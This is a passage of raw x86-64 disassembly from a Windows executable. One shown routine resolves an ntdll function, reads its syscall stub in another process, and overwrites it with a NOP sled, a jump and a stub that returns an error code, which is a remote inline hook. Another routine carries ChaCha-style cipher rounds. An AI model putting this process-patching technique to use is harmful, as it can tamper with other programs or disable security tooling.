   140001ea2:	ff 15 78 14 01 00    	call   *0x11478(%rip)        # 0x140013320
   140001ea8:	8b 5d 77             	mov    0x77(%rbp),%ebx
   140001eab:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001eb0:	2b 5d 7f             	sub    0x7f(%rbp),%ebx
   140001eb3:	ff 15 6f 14 01 00    	call   *0x1146f(%rip)        # 0x140013328
   140001eb9:	41 03 de             	add    %r14d,%ebx
   140001ebc:	74 54                	je     0x140001f12
   140001ebe:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001ec3:	45 33 c0             	xor    %r8d,%r8d
   140001ec6:	33 d2                	xor    %edx,%edx
   140001ec8:	ff 15 2a 14 01 00    	call   *0x1142a(%rip)        # 0x1400132f8
   140001ece:	48 8d 4d af          	lea    -0x51(%rbp),%rcx
   140001ed2:	48 8b d8             	mov    %rax,%rbx
   140001ed5:	ff 15 15 14 01 00    	call   *0x11415(%rip)        # 0x1400132f0
   140001edb:	b8 08 20 00 00       	mov    $0x2008,%eax
   140001ee0:	48 89 5d b7          	mov    %rbx,-0x49(%rbp)
   140001ee4:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140001ee9:	66 89 45 af          	mov    %ax,-0x51(%rbp)
   140001eed:	45 8b c6             	mov    %r14d,%r8d
   140001ef0:	33 d2                	xor    %edx,%edx
   140001ef2:	ff 15 00 14 01 00    	call   *0x11400(%rip)        # 0x1400132f8
   140001ef8:	4c 8d 45 af          	lea    -0x51(%rbp),%r8
   140001efc:	44 89 6d 77          	mov    %r13d,0x77(%rbp)
   140001f00:	48 8b c8             	mov    %rax,%rcx
   140001f03:	48 8d 55 77          	lea    0x77(%rbp),%rdx
   140001f07:	48 8b d8             	mov    %rax,%rbx
   140001f0a:	ff 15 f0 13 01 00    	call   *0x113f0(%rip)        # 0x140013300
   140001f10:	eb 03                	jmp    0x140001f15
   140001f12:	49 8b dd             	mov    %r13,%rbx
   140001f15:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001f1a:	4c 8d 4d 07          	lea    0x7(%rbp),%r9
   140001f1e:	0f 10 45 c7          	movups -0x39(%rbp),%xmm0
   140001f22:	48 8d 55 e7          	lea    -0x19(%rbp),%rdx
   140001f26:	4c 8b c3             	mov    %rbx,%r8
   140001f29:	f2 0f 10 4d d7       	movsd  -0x29(%rbp),%xmm1
   140001f2e:	48 8b 01             	mov    (%rcx),%rax
   140001f31:	0f 29 45 e7          	movaps %xmm0,-0x19(%rbp)
   140001f35:	f2 0f 11 4d f7       	movsd  %xmm1,-0x9(%rbp)
   140001f3a:	ff 90 28 01 00 00    	call   *0x128(%rax)
   140001f40:	85 c0                	test   %eax,%eax
   140001f42:	45 0f b6 e4          	movzbl %r12b,%r12d
   140001f46:	45 0f 49 e6          	cmovns %r14d,%r12d
   140001f4a:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   140001f4e:	ff 15 b4 13 01 00    	call   *0x113b4(%rip)        # 0x140013308
   140001f54:	4c 8b ac 24 e0 00 00 	mov    0xe0(%rsp),%r13
   140001f5b:	00 
   140001f5c:	48 85 db             	test   %rbx,%rbx
   140001f5f:	74 09                	je     0x140001f6a
   140001f61:	48 8b cb             	mov    %rbx,%rcx
   140001f64:	ff 15 be 13 01 00    	call   *0x113be(%rip)        # 0x140013328
   140001f6a:	48 8b 9c 24 20 01 00 	mov    0x120(%rsp),%rbx
   140001f71:	00 
   140001f72:	48 85 ff             	test   %rdi,%rdi
   140001f75:	74 09                	je     0x140001f80
   140001f77:	48 8b cf             	mov    %rdi,%rcx
   140001f7a:	ff 15 a8 13 01 00    	call   *0x113a8(%rip)        # 0x140013328
   140001f80:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001f85:	48 8b bc 24 f0 00 00 	mov    0xf0(%rsp),%rdi
   140001f8c:	00 
   140001f8d:	48 85 c9             	test   %rcx,%rcx
   140001f90:	74 06                	je     0x140001f98
   140001f92:	48 8b 01             	mov    (%rcx),%rax
   140001f95:	ff 50 10             	call   *0x10(%rax)
   140001f98:	48 8b 4d 97          	mov    -0x69(%rbp),%rcx
   140001f9c:	48 85 c9             	test   %rcx,%rcx
   140001f9f:	74 06                	je     0x140001fa7
   140001fa1:	48 8b 01             	mov    (%rcx),%rax
   140001fa4:	ff 50 10             	call   *0x10(%rax)
   140001fa7:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001fac:	48 85 c9             	test   %rcx,%rcx
   140001faf:	74 06                	je     0x140001fb7
   140001fb1:	48 8b 01             	mov    (%rcx),%rax
   140001fb4:	ff 50 10             	call   *0x10(%rax)
   140001fb7:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   140001fbb:	48 85 c9             	test   %rcx,%rcx
   140001fbe:	74 06                	je     0x140001fc6
   140001fc0:	48 8b 01             	mov    (%rcx),%rax
   140001fc3:	ff 50 10             	call   *0x10(%rax)
   140001fc6:	48 8b 4d 87          	mov    -0x79(%rbp),%rcx
   140001fca:	48 85 c9             	test   %rcx,%rcx
   140001fcd:	74 06                	je     0x140001fd5
   140001fcf:	48 8b 01             	mov    (%rcx),%rax
   140001fd2:	ff 50 10             	call   *0x10(%rax)
   140001fd5:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140001fda:	48 85 c9             	test   %rcx,%rcx
   140001fdd:	74 06                	je     0x140001fe5
   140001fdf:	48 8b 01             	mov    (%rcx),%rax
   140001fe2:	ff 50 10             	call   *0x10(%rax)
   140001fe5:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140001fe9:	48 85 c9             	test   %rcx,%rcx
   140001fec:	74 06                	je     0x140001ff4
   140001fee:	48 8b 11             	mov    (%rcx),%rdx
   140001ff1:	ff 52 10             	call   *0x10(%rdx)
   140001ff4:	48 85 f6             	test   %rsi,%rsi
   140001ff7:	74 09                	je     0x140002002
   140001ff9:	48 8b ce             	mov    %rsi,%rcx
   140001ffc:	ff 15 7e 10 01 00    	call   *0x1107e(%rip)        # 0x140013080
   140002002:	48 8b b4 24 f8 00 00 	mov    0xf8(%rsp),%rsi
   140002009:	00 
   14000200a:	41 0f b6 c4          	movzbl %r12b,%eax
   14000200e:	4c 8b a4 24 e8 00 00 	mov    0xe8(%rsp),%r12
   140002015:	00 
   140002016:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   14000201d:	41 5f                	pop    %r15
   14000201f:	41 5e                	pop    %r14
   140002021:	5d                   	pop    %rbp
   140002022:	c3                   	ret
   140002023:	32 c0                	xor    %al,%al
   140002025:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   14000202c:	41 5f                	pop    %r15
   14000202e:	41 5e                	pop    %r14
   140002030:	5d                   	pop    %rbp
   140002031:	c3                   	ret
   140002032:	cc                   	int3
   140002033:	cc                   	int3
   140002034:	cc                   	int3
   140002035:	cc                   	int3
   140002036:	cc                   	int3
   140002037:	cc                   	int3
   140002038:	cc                   	int3
   140002039:	cc                   	int3
   14000203a:	cc                   	int3
   14000203b:	cc                   	int3
   14000203c:	cc                   	int3
   14000203d:	cc                   	int3
   14000203e:	cc                   	int3
   14000203f:	cc                   	int3
   140002040:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002045:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000204a:	55                   	push   %rbp
   14000204b:	57                   	push   %rdi
   14000204c:	41 54                	push   %r12
   14000204e:	41 56                	push   %r14
   140002050:	41 57                	push   %r15
   140002052:	48 8d 6c 24 c9       	lea    -0x37(%rsp),%rbp
   140002057:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   14000205e:	66 0f 6f 05 5a 15 01 	movdqa 0x1155a(%rip),%xmm0        # 0x1400135c0
   140002065:	00 
   140002066:	48 8b d9             	mov    %rcx,%rbx
   140002069:	48 8d 4d 7f          	lea    0x7f(%rbp),%rcx
   14000206d:	c7 45 7f 6e 74 64 6c 	movl   $0x6c64746e,0x7f(%rbp)
   140002074:	f3 0f 7f 45 ff       	movdqu %xmm0,-0x1(%rbp)
   140002079:	4c 8b fa             	mov    %rdx,%r15
   14000207c:	66 c7 85 83 00 00 00 	movw   $0x6c,0x83(%rbp)
   140002083:	6c 00 
   140002085:	c7 45 0f 6d 6f 72 79 	movl   $0x79726f6d,0xf(%rbp)
   14000208c:	c6 45 13 00          	movb   $0x0,0x13(%rbp)
   140002090:	ff 15 fa 0f 01 00    	call   *0x10ffa(%rip)        # 0x140013090
   140002096:	48 85 c0             	test   %rax,%rax
   140002099:	0f 84 55 02 00 00    	je     0x1400022f4
   14000209f:	48 8d 55 ff          	lea    -0x1(%rbp),%rdx
   1400020a3:	48 8b c8             	mov    %rax,%rcx
   1400020a6:	ff 15 ec 0f 01 00    	call   *0x10fec(%rip)        # 0x140013098
   1400020ac:	4c 8b f0             	mov    %rax,%r14
   1400020af:	48 83 f8 09          	cmp    $0x9,%rax
   1400020b3:	0f 82 3b 02 00 00    	jb     0x1400022f4
   1400020b9:	48 8d 45 77          	lea    0x77(%rbp),%rax
   1400020bd:	45 33 e4             	xor    %r12d,%r12d
   1400020c0:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   1400020c6:	44 89 65 77          	mov    %r12d,0x77(%rbp)
   1400020ca:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400020d0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400020d5:	49 8d 56 f8          	lea    -0x8(%r14),%rdx
   1400020d9:	48 8b cb             	mov    %rbx,%rcx
   1400020dc:	ff 15 16 ca 01 00    	call   *0x1ca16(%rip)        # 0x14001eaf8
   1400020e2:	85 c0                	test   %eax,%eax
   1400020e4:	0f 84 0a 02 00 00    	je     0x1400022f4
   1400020ea:	33 d2                	xor    %edx,%edx
   1400020ec:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400020f3:	00 
   1400020f4:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   1400020fa:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002100:	48 8b cb             	mov    %rbx,%rcx
   140002103:	ff 15 e7 c9 01 00    	call   *0x1c9e7(%rip)        # 0x14001eaf0
   140002109:	48 8b f0             	mov    %rax,%rsi
   14000210c:	48 85 c0             	test   %rax,%rax
   14000210f:	0f 84 df 01 00 00    	je     0x1400022f4
   140002115:	48 8d 45 d7          	lea    -0x29(%rbp),%rax
   140002119:	4c 89 65 d7          	mov    %r12,-0x29(%rbp)
   14000211d:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   140002123:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002128:	4c 8d 45 17          	lea    0x17(%rbp),%r8
   14000212c:	48 8b cb             	mov    %rbx,%rcx
   14000212f:	49 8d 56 f8          	lea    -0x8(%r14),%rdx
   140002133:	ff 15 a7 c9 01 00    	call   *0x1c9a7(%rip)        # 0x14001eae0
   140002139:	85 c0                	test   %eax,%eax
   14000213b:	0f 84 b3 01 00 00    	je     0x1400022f4
   140002141:	48 83 7d d7 20       	cmpq   $0x20,-0x29(%rbp)
   140002146:	0f 85 a8 01 00 00    	jne    0x1400022f4
   14000214c:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002152:	48 c7 45 87 0f 1f 84 	movq   $0x841f0f,-0x79(%rbp)
   140002159:	00 
   14000215a:	48 8d 55 87          	lea    -0x79(%rbp),%rdx
   14000215e:	48 8d 4d 17          	lea    0x17(%rbp),%rcx
   140002162:	e8 29 ef 00 00       	call   0x140011090
   140002167:	85 c0                	test   %eax,%eax
   140002169:	0f 85 85 01 00 00    	jne    0x1400022f4
   14000216f:	c7 45 8f 4c 8b d1 b8 	movl   $0xb8d18b4c,-0x71(%rbp)
   140002176:	48 8d 55 1f          	lea    0x1f(%rbp),%rdx
   14000217a:	c7 45 93 ff 00 00 00 	movl   $0xff,-0x6d(%rbp)
   140002181:	4c 8d 45 8f          	lea    -0x71(%rbp),%r8
   140002185:	41 8b cc             	mov    %r12d,%ecx
   140002188:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000218f:	00 
   140002190:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   140002194:	48 ff c1             	inc    %rcx
   140002197:	41 3a 44 08 ff       	cmp    -0x1(%r8,%rcx,1),%al
   14000219c:	75 0b                	jne    0x1400021a9
   14000219e:	48 83 f9 04          	cmp    $0x4,%rcx
   1400021a2:	75 ec                	jne    0x140002190
   1400021a4:	41 8b c4             	mov    %r12d,%eax
   1400021a7:	eb 05                	jmp    0x1400021ae
   1400021a9:	1b c0                	sbb    %eax,%eax
   1400021ab:	83 c8 01             	or     $0x1,%eax
   1400021ae:	85 c0                	test   %eax,%eax
   1400021b0:	0f 85 3e 01 00 00    	jne    0x1400022f4
   1400021b6:	0f 10 4d 17          	movups 0x17(%rbp),%xmm1
   1400021ba:	48 b8 90 90 90 90 90 	movabs $0x9090909090909090,%rax
   1400021c1:	90 90 90 
   1400021c4:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   1400021ca:	0f 10 45 27          	movups 0x27(%rbp),%xmm0
   1400021ce:	4c 8d 45 df          	lea    -0x21(%rbp),%r8
   1400021d2:	48 8b cb             	mov    %rbx,%rcx
   1400021d5:	0f 11 4d df          	movups %xmm1,-0x21(%rbp)
   1400021d9:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   1400021dd:	49 8d 56 f8          	lea    -0x8(%r14),%rdx
   1400021e1:	0f 29 45 c7          	movaps %xmm0,-0x39(%rbp)
   1400021e5:	49 8d 46 08          	lea    0x8(%r14),%rax
   1400021e9:	0f 29 4d b7          	movaps %xmm1,-0x49(%rbp)
   1400021ed:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   1400021f1:	48 8d 45 87          	lea    -0x79(%rbp),%rax
   1400021f5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021fa:	0f 11 45 ef          	movups %xmm0,-0x11(%rbp)
   1400021fe:	48 89 75 df          	mov    %rsi,-0x21(%rbp)
   140002202:	c7 45 e7 ff 25 f2 ff 	movl   $0xfff225ff,-0x19(%rbp)
   140002209:	66 c7 45 eb ff ff    	movw   $0xffff,-0x15(%rbp)
   14000220f:	66 44 89 65 ac       	mov    %r12w,-0x54(%rbp)
   140002214:	44 88 65 ae          	mov    %r12b,-0x52(%rbp)
   140002218:	c7 45 97 49 83 f8 0e 	movl   $0xef88349,-0x69(%rbp)
   14000221f:	c7 45 9b 75 22 48 3b 	movl   $0x3b482275,-0x65(%rbp)
   140002226:	c7 45 9f 15 0b 00 00 	movl   $0xb15,-0x61(%rbp)
   14000222d:	c7 45 a3 00 75 19 b8 	movl   $0xb8197500,-0x5d(%rbp)
   140002234:	c7 45 a7 bb 00 00 c0 	movl   $0xc00000bb,-0x59(%rbp)
   14000223b:	c6 45 ab c3          	movb   $0xc3,-0x55(%rbp)
   14000223f:	4c 89 7d af          	mov    %r15,-0x51(%rbp)
   140002243:	c7 45 c7 ff 25 ea ff 	movl   $0xffea25ff,-0x39(%rbp)
   14000224a:	66 c7 45 cb ff ff    	movw   $0xffff,-0x35(%rbp)
   140002250:	4c 89 65 87          	mov    %r12,-0x79(%rbp)
   140002254:	ff 15 8e c8 01 00    	call   *0x1c88e(%rip)        # 0x14001eae8
   14000225a:	85 c0                	test   %eax,%eax
   14000225c:	0f 84 92 00 00 00    	je     0x1400022f4
   140002262:	48 83 7d 87 20       	cmpq   $0x20,-0x79(%rbp)
   140002267:	0f 85 87 00 00 00    	jne    0x1400022f4
   14000226d:	44 8b 4d 77          	mov    0x77(%rbp),%r9d
   140002271:	48 8d 45 77          	lea    0x77(%rbp),%rax
   140002275:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000227b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002280:	49 8d 56 f8          	lea    -0x8(%r14),%rdx
   140002284:	48 8b cb             	mov    %rbx,%rcx
   140002287:	ff 15 6b c8 01 00    	call   *0x1c86b(%rip)        # 0x14001eaf8
   14000228d:	85 c0                	test   %eax,%eax
   14000228f:	74 63                	je     0x1400022f4
   140002291:	48 8d 45 87          	lea    -0x79(%rbp),%rax
   140002295:	41 b9 36 00 00 00    	mov    $0x36,%r9d
   14000229b:	4c 8d 45 97          	lea    -0x69(%rbp),%r8
   14000229f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400022a4:	48 8b d6             	mov    %rsi,%rdx
   1400022a7:	48 8b cb             	mov    %rbx,%rcx
   1400022aa:	ff 15 38 c8 01 00    	call   *0x1c838(%rip)        # 0x14001eae8
   1400022b0:	85 c0                	test   %eax,%eax
   1400022b2:	74 40                	je     0x1400022f4
   1400022b4:	48 83 7d 87 36       	cmpq   $0x36,-0x79(%rbp)
   1400022b9:	75 39                	jne    0x1400022f4
   1400022bb:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   1400022c1:	48 8d 45 77          	lea    0x77(%rbp),%rax
   1400022c5:	45 8b c1             	mov    %r9d,%r8d
   1400022c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400022cd:	48 8b d6             	mov    %rsi,%rdx
   1400022d0:	48 8b cb             	mov    %rbx,%rcx
   1400022d3:	ff 15 1f c8 01 00    	call   *0x1c81f(%rip)        # 0x14001eaf8
   1400022d9:	85 c0                	test   %eax,%eax
   1400022db:	74 17                	je     0x1400022f4
   1400022dd:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400022e3:	49 8d 56 f8          	lea    -0x8(%r14),%rdx
   1400022e7:	48 8b cb             	mov    %rbx,%rcx
   1400022ea:	ff 15 40 0d 01 00    	call   *0x10d40(%rip)        # 0x140013030
   1400022f0:	b0 01                	mov    $0x1,%al
   1400022f2:	eb 02                	jmp    0x1400022f6
   1400022f4:	32 c0                	xor    %al,%al
   1400022f6:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   1400022fd:	00 
   1400022fe:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002302:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140002306:	49 8b e3             	mov    %r11,%rsp
   140002309:	41 5f                	pop    %r15
   14000230b:	41 5e                	pop    %r14
   14000230d:	41 5c                	pop    %r12
   14000230f:	5f                   	pop    %rdi
   140002310:	5d                   	pop    %rbp
   140002311:	c3                   	ret
   140002312:	cc                   	int3
   140002313:	cc                   	int3
   140002314:	cc                   	int3
   140002315:	cc                   	int3
   140002316:	cc                   	int3
   140002317:	cc                   	int3
   140002318:	cc                   	int3
   140002319:	cc                   	int3
   14000231a:	cc                   	int3
   14000231b:	cc                   	int3
   14000231c:	cc                   	int3
   14000231d:	cc                   	int3
   14000231e:	cc                   	int3
   14000231f:	cc                   	int3
   140002320:	48 8b c4             	mov    %rsp,%rax
   140002323:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002327:	48 89 50 10          	mov    %rdx,0x10(%rax)
   14000232b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000232f:	55                   	push   %rbp
   140002330:	48 8d 68 e8          	lea    -0x18(%rax),%rbp
   140002334:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   14000233b:	4d 8b d8             	mov    %r8,%r11
   14000233e:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140002345:	00 00 
   140002347:	4c 8b c1             	mov    %rcx,%r8
   14000234a:	4d 85 db             	test   %r11,%r11
   14000234d:	0f 84 e7 03 00 00    	je     0x14000273a
   140002353:	48 89 58 f0          	mov    %rbx,-0x10(%rax)
   140002357:	48 89 70 e8          	mov    %rsi,-0x18(%rax)
   14000235b:	48 89 78 e0          	mov    %rdi,-0x20(%rax)
   14000235f:	4c 89 60 d8          	mov    %r12,-0x28(%rax)
   140002363:	4c 89 68 d0          	mov    %r13,-0x30(%rax)
   140002367:	4c 89 70 c8          	mov    %r14,-0x38(%rax)
   14000236b:	4c 89 78 c0          	mov    %r15,-0x40(%rax)
   14000236f:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   140002373:	48 2b c2             	sub    %rdx,%rax
   140002376:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000237b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002380:	41 0f 10 00          	movups (%r8),%xmm0
   140002384:	48 c7 45 80 0a 00 00 	movq   $0xa,-0x80(%rbp)
   14000238b:	00 
   14000238c:	41 0f 10 48 10       	movups 0x10(%r8),%xmm1
   140002391:	0f 11 44 24 10       	movups %xmm0,0x10(%rsp)
   140002396:	41 0f 10 40 20       	movups 0x20(%r8),%xmm0
   14000239b:	0f 11 4c 24 20       	movups %xmm1,0x20(%rsp)
   1400023a0:	41 0f 10 48 30       	movups 0x30(%r8),%xmm1
   1400023a5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1400023a9:	44 8b 4c 24 28       	mov    0x28(%rsp),%r9d
   1400023ae:	8b 54 24 24          	mov    0x24(%rsp),%edx
   1400023b2:	44 8b 54 24 20       	mov    0x20(%rsp),%r10d
   1400023b7:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   1400023bc:	44 8b 7c 24 4c       	mov    0x4c(%rsp),%r15d
   1400023c1:	44 8b 64 24 48       	mov    0x48(%rsp),%r12d
   1400023c6:	44 8b 6c 24 44       	mov    0x44(%rsp),%r13d
   1400023cb:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   1400023d0:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400023d5:	8b 5c 24 34          	mov    0x34(%rsp),%ebx
   1400023d9:	8b 74 24 30          	mov    0x30(%rsp),%esi
   1400023dd:	89 44 24 04          	mov    %eax,0x4(%rsp)
   1400023e1:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   1400023e6:	8b 7c 24 10          	mov    0x10(%rsp),%edi
   1400023ea:	41 03 fa             	add    %r10d,%edi
   1400023ed:	8b cf                	mov    %edi,%ecx
   1400023ef:	41 33 ce             	xor    %r14d,%ecx
   1400023f2:	44 8b 74 24 14       	mov    0x14(%rsp),%r14d
   1400023f7:	c1 c9 10             	ror    $0x10,%ecx
   1400023fa:	44 03 f2             	add    %edx,%r14d
   1400023fd:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   140002401:	44 8d 1c 31          	lea    (%rcx,%rsi,1),%r11d
   140002405:	45 33 da             	xor    %r10d,%r11d
   140002408:	41 c1 cb 14          	ror    $0x14,%r11d
   14000240c:	41 8d 04 3b          	lea    (%r11,%rdi,1),%eax
   140002410:	33 c1                	xor    %ecx,%eax
   140002412:	c1 c8 18             	ror    $0x18,%eax
   140002415:	89 04 24             	mov    %eax,(%rsp)
   140002418:	03 c1                	add    %ecx,%eax
   14000241a:	03 c6                	add    %esi,%eax
   14000241c:	41 8b ce             	mov    %r14d,%ecx
   14000241f:	41 33 cd             	xor    %r13d,%ecx
   140002422:	41 33 c3             	xor    %r11d,%eax
   140002425:	44 8b 6c 24 18       	mov    0x18(%rsp),%r13d
   14000242a:	c1 c9 10             	ror    $0x10,%ecx
   14000242d:	45 03 e9             	add    %r9d,%r13d
   140002430:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   140002434:	c1 c8 19             	ror    $0x19,%eax
   140002437:	89 44 24 5c          	mov    %eax,0x5c(%rsp)
   14000243b:	8d 34 19             	lea    (%rcx,%rbx,1),%esi
   14000243e:	33 f2                	xor    %edx,%esi
   140002440:	41 8b d5             	mov    %r13d,%edx
   140002443:	41 33 d4             	xor    %r12d,%edx
   140002446:	c1 ce 14             	ror    $0x14,%esi
   140002449:	c1 ca 10             	ror    $0x10,%edx
   14000244c:	42 8d 04 36          	lea    (%rsi,%r14,1),%eax
   140002450:	33 c1                	xor    %ecx,%eax
   140002452:	46 8d 24 02          	lea    (%rdx,%r8,1),%r12d
   140002456:	45 33 e1             	xor    %r9d,%r12d
   140002459:	c1 c8 18             	ror    $0x18,%eax
   14000245c:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140002460:	03 c1                	add    %ecx,%eax
   140002462:	03 c3                	add    %ebx,%eax
   140002464:	41 c1 cc 14          	ror    $0x14,%r12d
   140002468:	33 c6                	xor    %esi,%eax
   14000246a:	c1 c8 19             	ror    $0x19,%eax
   14000246d:	43 8d 0c 2c          	lea    (%r12,%r13,1),%ecx
   140002471:	33 ca                	xor    %edx,%ecx
   140002473:	c1 c9 18             	ror    $0x18,%ecx
   140002476:	89 4d 38             	mov    %ecx,0x38(%rbp)
   140002479:	44 8d 0c 11          	lea    (%rcx,%rdx,1),%r9d
   14000247d:	8b 4c 24 3c          	mov    0x3c(%rsp),%ecx
   140002481:	45 03 c8             	add    %r8d,%r9d
   140002484:	44 8b 44 24 1c       	mov    0x1c(%rsp),%r8d
   140002489:	44 03 44 24 04       	add    0x4(%rsp),%r8d
   14000248e:	45 33 cc             	xor    %r12d,%r9d
   140002491:	45 8b d0             	mov    %r8d,%r10d
   140002494:	44 89 44 24 68       	mov    %r8d,0x68(%rsp)
   140002499:	45 33 d7             	xor    %r15d,%r10d
   14000249c:	41 c1 c9 19          	ror    $0x19,%r9d
   1400024a0:	41 c1 ca 10          	ror    $0x10,%r10d
   1400024a4:	41 03 ca             	add    %r10d,%ecx
   1400024a7:	33 4c 24 04          	xor    0x4(%rsp),%ecx
   1400024ab:	c1 c9 14             	ror    $0x14,%ecx
   1400024ae:	89 4c 24 64          	mov    %ecx,0x64(%rsp)
   1400024b2:	46 8d 3c 01          	lea    (%rcx,%r8,1),%r15d
   1400024b6:	45 8b c7             	mov    %r15d,%r8d
   1400024b9:	44 89 7c 24 58       	mov    %r15d,0x58(%rsp)
   1400024be:	44 8b 7d 38          	mov    0x38(%rbp),%r15d
   1400024c2:	45 33 c2             	xor    %r10d,%r8d
   1400024c5:	41 c1 c8 18          	ror    $0x18,%r8d
   1400024c9:	43 8d 1c 10          	lea    (%r8,%r10,1),%ebx
   1400024cd:	03 5c 24 3c          	add    0x3c(%rsp),%ebx
   1400024d1:	33 d9                	xor    %ecx,%ebx
   1400024d3:	42 8d 0c 18          	lea    (%rax,%r11,1),%ecx
   1400024d7:	03 cf                	add    %edi,%ecx
   1400024d9:	c1 cb 19             	ror    $0x19,%ebx
   1400024dc:	41 33 c8             	xor    %r8d,%ecx
   1400024df:	c1 c9 10             	ror    $0x10,%ecx
   1400024e2:	44 03 f9             	add    %ecx,%r15d
   1400024e5:	44 03 fa             	add    %edx,%r15d
   1400024e8:	44 03 7c 24 38       	add    0x38(%rsp),%r15d
   1400024ed:	44 33 f8             	xor    %eax,%r15d
   1400024f0:	41 c1 cf 14          	ror    $0x14,%r15d
   1400024f4:	41 03 c7             	add    %r15d,%eax
   1400024f7:	41 03 c3             	add    %r11d,%eax
   1400024fa:	44 8b 5d 38          	mov    0x38(%rbp),%r11d
   1400024fe:	03 c7                	add    %edi,%eax
   140002500:	8b 3c 24             	mov    (%rsp),%edi
   140002503:	89 44 24 10          	mov    %eax,0x10(%rsp)
   140002507:	33 c1                	xor    %ecx,%eax
   140002509:	c1 c8 18             	ror    $0x18,%eax
   14000250c:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   140002510:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   140002514:	03 c1                	add    %ecx,%eax
   140002516:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   14000251a:	41 03 c3             	add    %r11d,%eax
   14000251d:	03 c2                	add    %edx,%eax
   14000251f:	03 c8                	add    %eax,%ecx
   140002521:	44 33 f9             	xor    %ecx,%r15d
   140002524:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140002528:	41 c1 cf 19          	ror    $0x19,%r15d
   14000252c:	41 8d 0c 31          	lea    (%r9,%rsi,1),%ecx
   140002530:	41 03 ce             	add    %r14d,%ecx
   140002533:	44 89 7d 38          	mov    %r15d,0x38(%rbp)
   140002537:	33 cf                	xor    %edi,%ecx
   140002539:	44 89 7c 24 24       	mov    %r15d,0x24(%rsp)
   14000253e:	44 8b 7c 24 3c       	mov    0x3c(%rsp),%r15d
   140002543:	c1 c9 10             	ror    $0x10,%ecx
   140002546:	42 8d 14 01          	lea    (%rcx,%r8,1),%edx
   14000254a:	41 03 d2             	add    %r10d,%edx
   14000254d:	41 03 d7             	add    %r15d,%edx
   140002550:	41 33 d1             	xor    %r9d,%edx
   140002553:	c1 ca 14             	ror    $0x14,%edx
   140002556:	42 8d 04 0a          	lea    (%rdx,%r9,1),%eax
   14000255a:	44 8b 4c 24 50       	mov    0x50(%rsp),%r9d
   14000255f:	03 c6                	add    %esi,%eax
   140002561:	8b 74 24 30          	mov    0x30(%rsp),%esi
   140002565:	44 03 f0             	add    %eax,%r14d
   140002568:	44 89 74 24 14       	mov    %r14d,0x14(%rsp)
   14000256d:	44 33 f1             	xor    %ecx,%r14d
   140002570:	41 c1 ce 18          	ror    $0x18,%r14d
   140002574:	41 8d 04 0e          	lea    (%r14,%rcx,1),%eax
   140002578:	41 03 c0             	add    %r8d,%eax
   14000257b:	42 8d 0c 23          	lea    (%rbx,%r12,1),%ecx
   14000257f:	41 03 c2             	add    %r10d,%eax
   140002582:	41 03 cd             	add    %r13d,%ecx
   140002585:	44 03 f8             	add    %eax,%r15d
   140002588:	41 33 c9             	xor    %r9d,%ecx
   14000258b:	c1 c9 10             	ror    $0x10,%ecx
   14000258e:	41 8b c7             	mov    %r15d,%eax
   140002591:	33 c2                	xor    %edx,%eax
   140002593:	44 89 7c 24 3c       	mov    %r15d,0x3c(%rsp)
   140002598:	c1 c8 19             	ror    $0x19,%eax
   14000259b:	89 04 24             	mov    %eax,(%rsp)
   14000259e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400025a2:	8d 14 39             	lea    (%rcx,%rdi,1),%edx
